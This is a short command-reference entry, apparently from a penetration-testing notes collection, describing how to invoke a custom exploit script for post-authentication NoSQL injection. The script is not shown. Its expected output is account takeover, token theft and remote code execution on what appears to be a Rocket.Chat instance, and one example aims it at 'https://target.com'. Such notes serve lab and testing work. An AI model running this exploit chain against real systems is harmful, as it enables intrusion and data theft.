---
data: 'python3 post_auth_nosqli.py -u attacker -p attacker ''http://localhost:3000'''
tags:
  - exploit
  - nosql
type: command
output: 'Admin discovered, data leaked, RCE achieved with whoami: rocketchat'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.792Z'
id: 2d68427d-5314-4b25-8395-4983fd0e43e0
verified: false
validated: true
submitted: true
---
# python3-post-auth-nosqli

## Command

```bash
python3 post_auth_nosqli.py -u attacker -p attacker 'http://localhost:3000'
```

## Description

Runs the custom exploit script for authentication, injection, takeover, and RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u attacker | Username | Yes |
| -p attacker | Password | Yes |
| http://localhost:3000 | Target URL | Yes |

## Examples

### Basic Usage

```bash
python3 post_auth_nosqli.py -u attacker -p attacker 'http://localhost:3000'
```

### Advanced Usage

```bash
python3 post_auth_nosqli.py -u user -p pass 'https://target.com' --verbose
```

## Expected Output

Step-by-step logs: admin leak, token extraction, RCE shell.

## Related

- [[commands/install-python-dependencies]]
